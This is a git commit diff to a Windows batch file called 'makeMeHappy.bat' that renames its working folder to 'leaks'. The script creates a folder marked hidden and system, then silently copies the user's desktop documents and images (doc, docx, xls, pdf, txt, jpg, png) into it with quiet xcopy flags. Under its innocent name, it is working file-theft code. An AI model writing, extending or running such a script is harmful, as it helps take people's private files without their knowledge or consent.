1c382bce4434aa5869f069e9dc70d7e31e40bdc0
Arman Yeghiazaryan <otanim617@gmail.com>
2016-01-09 21:30:00 +0400

    Update makeMeHappy.bat

--- makeMeHappy.bat
+++ makeMeHappy.bat
@@ -4,17 +4,17 @@ md leaks
 attrib +R +S +A +H "leak" /S /D
 
 :: docuements: preparation
-md coll\documents
+md leaks\documents
 :: documents: file types: doc, docx, xls, pdf, txt
-xcopy %userprofile%\desktop\*.doc coll\documents\*.doc /q /c /h /y /s
-xcopy %userprofile%\desktop\*.docx coll\documents\*.docx /q /c /h /y /s
-xcopy %userprofile%\desktop\*.xls coll\documents\*.xls /q /c /h /y /s
-xcopy %userprofile%\desktop\*.pdf coll\documents\*.pdf /q /c /h /y /s
-xcopy %userprofile%\desktop\*.txt coll\documents\*.txt /q /c /h /y /s
+xcopy %userprofile%\desktop\*.doc leaks\documents\*.doc /q /c /h /y /s
+xcopy %userprofile%\desktop\*.docx leaks\documents\*.docx /q /c /h /y /s
+xcopy %userprofile%\desktop\*.xls leaks\documents\*.xls /q /c /h /y /s
+xcopy %userprofile%\desktop\*.pdf leaks\documents\*.pdf /q /c /h /y /s
+xcopy %userprofile%\desktop\*.txt leaks\documents\*.txt /q /c /h /y /s
 
 :: docuements: preparation
-md coll\scans
+md leaks\scans
 :: scans: file types: jpg, ttf, png
-xcopy %userprofile%\desktop\*.jpg coll\scans\*.jpg /q /c /h /y /s
-xcopy %userprofile%\desktop\*.ttf coll\scans\*.ttf /q /c /h /y /s
-xcopy %userprofile%\desktop\*.png coll\scans\*.png /q /c /h /y /s
+xcopy %userprofile%\desktop\*.jpg leaks\scans\*.jpg /q /c /h /y /s
+xcopy %userprofile%\desktop\*.ttf leaks\scans\*.ttf /q /c /h /y /s
+xcopy %userprofile%\desktop\*.png leaks\scans\*.png /q /c /h /y /s
